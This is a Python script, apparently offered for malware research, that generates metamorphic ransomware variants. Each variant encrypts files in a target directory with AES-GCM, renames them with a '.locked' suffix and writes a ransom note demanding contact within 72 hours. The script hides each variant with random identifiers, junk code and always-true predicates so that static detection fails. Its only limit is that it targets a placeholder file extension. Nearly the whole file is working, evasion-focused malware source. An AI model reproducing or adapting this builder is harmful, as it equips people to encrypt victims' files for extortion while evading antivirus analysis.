"""
Metamorphic Ransomware Generator - Creates self-modifying ransomware variants with 
completely different code structures while maintaining identical functionality. 
Designed for advanced static analysis testing and polymorphic malware research.
"""
import random
import string
from pathlib import Path

def generate_method_name(length=16):
    """
    description: Generates random lowercase alphabetic strings for function and variable names
    parameters: length (int) - desired length of generated name, defaults to 16
    returns: str containing random lowercase letters for obfuscation purposes
    """
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_junk_code():
    """
    description: Creates meaningless code statements to pad generated functions and obscure real functionality
    parameters: None
    returns: str containing random no-op code statements joined with newlines and indentation
    """
    # Insert useless code as junk/no-op
    junk_lines = [
        f"{generate_method_name(6)} = {random.randint(1, 100)}",
        f"{generate_method_name(6)} = '{generate_method_name(4)}'",
        "pass",
        "[] == []",
        f"#{generate_method_name(12)}",
        f"assert True"
    ]
    return "\n    ".join(random.choices(junk_lines, k=random.randint(1,3)))

def opaque_predicate():
    """
    description: Generates always-true conditional statements to add control flow confusion and analysis evasion
    parameters: None
    returns: str containing mathematically equivalent conditional statement that always evaluates to true
    """
    # Simple opaque predicate to add control flow confusion
    x = random.randint(10, 99)
    y = x * 2
    return f"if ({x} + {x}) == {y}:\n        pass"

def generate_encryption_method(fn_name, var_key, var_nonce, var_aes):
    """
    description: Creates randomized AES-GCM encryption function implementations with varying code patterns and junk insertion
    parameters: fn_name (str) - function name, var_key (str) - key variable, var_nonce (str) - nonce variable, var_aes (str) - AES object variable
    returns: str containing complete function definition with randomized implementation pattern
    """
    impls = [
        f'''
def {fn_name}():
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    {generate_junk_code()}
    key = AESGCM.generate_key(bit_length=256)
    {var_aes} = AESGCM(key)
    {var_nonce} = os.urandom(12)
    {opaque_predicate()}
    return {var_aes}, {var_nonce}
    {generate_junk_code()}
''',
        f'''
def {fn_name}():
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = AESGCM.generate_key(bit_length=256)
    {opaque_predicate()}
    {generate_junk_code()}
    {var_nonce} = os.urandom(12)
    {var_aes} = AESGCM(key)
    return {var_aes}, {var_nonce}
    {generate_junk_code()}
''',
    ]
    return random.choice(impls)

def generate_rename_method(fn_name):
    """
    description: Creates different implementations for file renaming operations that add .locked extension to encrypted files
    parameters: fn_name (str) - randomized function name for the generated rename method
    returns: str containing complete function definition with randomized file renaming implementation
    """
    impls = [
        f'''
def {fn_name}(text):
    locked_path = text.with_suffix(text.suffix + ".locked")
    text.rename(locked_path)
    {generate_junk_code()}
''',
        f'''
def {fn_name}(text):
    # Renaming file with an added extension
    dummy_var = {random.randint(10, 100)}
    {generate_junk_code()}
    text.rename(text.parent / (text.name + ".locked"))
''',
    ]
    return random.choice(impls)

def generate_note_function(fn_name, note_file):
    """
    description: Creates varied implementations for writing ransom notes with different file handling approaches and random filenames
    parameters: fn_name (str) - randomized function name, note_file (str) - randomized ransom note filename
    returns: str containing complete function definition with randomized ransom note creation implementation
    """
    impls = [
        f'''
def {fn_name}(target_path):
    ransom_note_path = target_path / "{note_file}"
    ransom_note = [
        "All your important files have been encrypted.",
        "Contact: [ransom_email@example.com]",
        "You have 72 hours to comply.",
        "This is not a joke."
    ]
    {generate_junk_code()}
    ransom_note_path.write_text("\\n".join(ransom_note))
''',
        f'''
def {fn_name}(target_path):
    note = ["All your important files have been encrypted.",
            "Contact: [ransom_email@example.com]",
            "You have 72 hours to comply.",
            "This is not a joke."]
    {generate_junk_code()}
    with open(target_path / "{note_file}", "w") as f:
        f.write("\\n".join(note))
    {opaque_predicate()}
''',
    ]
    return random.choice(impls)

def generate_encrypted_files(fn_name, encrypt_fn, rename_fn):
    """
    description: Creates different implementations for the main file encryption loop with varied coding patterns and variable names
    parameters: fn_name (str) - function name, encrypt_fn (str) - encryption function name, rename_fn (str) - rename function name
    returns: str containing complete function definition with randomized file encryption and processing implementation
    """
    impls = [
        f'''
def {fn_name}(target_path):
    aes, nonce = {encrypt_fn}()
    for text in target_path.rglob("*.mcsdf"):
        buffer = text.read_bytes()
        ciphertext = aes.encrypt(nonce, buffer, None)
        text.write_bytes(ciphertext)
        {rename_fn}(text)
    {opaque_predicate()}
    {generate_junk_code()}
''',
        f'''
def {fn_name}(target_path):
    a, n = {encrypt_fn}()
    files = list(target_path.glob("*.mcsdf"))
    for t in files:
        ciphertext = a.encrypt(n, t.read_bytes(), None)
        t.write_bytes(ciphertext)
        {rename_fn}(t)
    {generate_junk_code()}
''',
    ]
    return random.choice(impls)

def generate_metamorphic_variants():
    """
    description: Main metamorphic engine that orchestrates creation of completely unique ransomware variants with randomized structure
    parameters: None
    returns: None - writes generated metamorphic variant to file in malware/generated-metamorphic directory
    """
    method_one = generate_method_name()
    method_two = generate_method_name()
    method_three = generate_method_name()
    method_four = generate_method_name()
    var_nonce = generate_method_name(6)
    var_aes = generate_method_name(6)
    note_file = ''.join(random.choices(string.ascii_uppercase, k=5)) + "_ransom.txt"
    
    code_blocks = [
        generate_encryption_method(method_one, "key", var_nonce, var_aes),
        generate_rename_method(method_two),
        generate_note_function(method_three, note_file),
        generate_encrypted_files(method_four, method_one, method_two)
    ]
    random.shuffle(code_blocks)

    main_code = f'''
import sys
from pathlib import Path

{"".join(code_blocks)}

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {{sys.argv[0]}} <target_directory>")
        sys.exit(1)
    target_directory = Path(sys.argv[1])
    target_directory.mkdir(parents=True, exist_ok=True)
    {method_four}(target_directory)
    {method_three}(target_directory)
'''
    output_dir = Path("malware/generated-metamorphic")
    output_dir.mkdir(parents=True, exist_ok=True)
    
    filename = f"./malware/generated-metamorphic/metamorphic_ransomware_{generate_method_name()}.py"
    with open(filename, "w") as f:
        f.write(main_code)
    print(f"Metamorphic variant written to {filename}")

if __name__ == "__main__":
    generate_metamorphic_variants()
